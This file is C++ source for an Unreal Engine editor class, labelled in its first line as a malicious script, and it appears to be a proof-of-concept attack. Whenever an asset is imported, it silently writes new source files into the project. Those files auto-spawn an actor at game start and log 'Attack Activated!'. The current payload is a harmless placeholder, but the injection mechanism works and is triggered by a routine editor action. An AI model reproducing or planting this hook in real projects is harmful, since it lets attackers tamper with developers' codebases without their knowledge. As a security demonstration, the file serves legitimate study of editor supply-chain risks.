//Malicious Script to trigger Attack code at runtime
//AssetImportNotifier.cpp

#include "AssetImportNotifier.h"
#include "Editor.h"
#include "Subsystems/ImportSubsystem.h"
#include "Misc/FileHelper.h"
#include "HAL/PlatformFilemanager.h"
#include "Misc/Paths.h"

void UAssetImportNotifier::PostInitProperties()
{
    Super::PostInitProperties();

    if (UImportSubsystem* ImportSubsystem = GEditor->GetEditorSubsystem<UImportSubsystem>())
    {
        ImportDelegateHandle = ImportSubsystem->OnAssetPostImport.AddUObject(
            this,
            &UAssetImportNotifier::OnAssetPostImport
        );
    }
}

void UAssetImportNotifier::BeginDestroy()
{
    if (UImportSubsystem* ImportSubsystem = GEditor->GetEditorSubsystem<UImportSubsystem>())
    {
        ImportSubsystem->OnAssetPostImport.Remove(ImportDelegateHandle);
    }

    Super::BeginDestroy();
}

void UAssetImportNotifier::OnAssetPostImport(UFactory* Factory, UObject* ImportedAsset)
{
    const FString BaseDir = FPaths::Combine(FPaths::ProjectDir(), TEXT("Source/ATTDANSYN"));
    const FString HPath = FPaths::Combine(BaseDir, TEXT("HelloWorldActor.h"));
    const FString CPPPath = FPaths::Combine(BaseDir, TEXT("HelloWorldActor.cpp"));

    IPlatformFile& PF = FPlatformFileManager::Get().GetPlatformFile();
    PF.CreateDirectoryTree(*BaseDir);

    const FString HContents = R"HEADER(#pragma once

#include "CoreMinimal.h"
#include "GameFramework/Actor.h"
#include "HelloWorldActor.generated.h"

UCLASS()
class ATTDANSYN_API AHelloWorldActor : public AActor
{
    GENERATED_BODY()

public:
    AHelloWorldActor();

protected:
    virtual void BeginPlay() override;
};
)HEADER";

    const FString CPPContents = R"SOURCE(#include "HelloWorldActor.h"
#include "Engine/World.h"
#include "Engine/Engine.h"
#include "UObject/UObjectGlobals.h"
#include "EngineUtils.h"

AHelloWorldActor::AHelloWorldActor()
{
    PrimaryActorTick.bCanEverTick = false;
}

void AHelloWorldActor::BeginPlay()
{
    Super::BeginPlay();

    UE_LOG(LogTemp, Warning, TEXT("Hello from HelloWorldActor!"));

    if (GEngine)
    {
        GEngine->AddOnScreenDebugMessage(-1, 5.f, FColor::Green, TEXT("Attack Activated!"));
    }
}

class FHelloWorldAutoSpawner
{
public:
    FHelloWorldAutoSpawner()
    {
        FWorldDelegates::OnPostWorldInitialization.AddRaw(this, &FHelloWorldAutoSpawner::OnWorldInitialized);
    }

    void OnWorldInitialized(UWorld* World, const UWorld::InitializationValues IVS)
    {
        if (!World || !(World->WorldType == EWorldType::Game || World->WorldType == EWorldType::PIE))
        {
            return;
        }

        for (TActorIterator<AHelloWorldActor> It(World); It; ++It)
        {
            return;
        }

        World->SpawnActor<AHelloWorldActor>(AHelloWorldActor::StaticClass(), FVector(0,0,200), FRotator::ZeroRotator);
        UE_LOG(LogTemp, Warning, TEXT(" Attack Activated!"));
    }
};

static FHelloWorldAutoSpawner GHelloWorldAutoSpawner;
)SOURCE";

    // Write files
    FFileHelper::SaveStringToFile(HContents, *HPath, FFileHelper::EEncodingOptions::ForceUTF8WithoutBOM);
    FFileHelper::SaveStringToFile(CPPContents, *CPPPath, FFileHelper::EEncodingOptions::ForceUTF8WithoutBOM);


    //UE_LOG(LogTemp, Log, TEXT("✅ HelloWorldActor files generated at import!"));
}
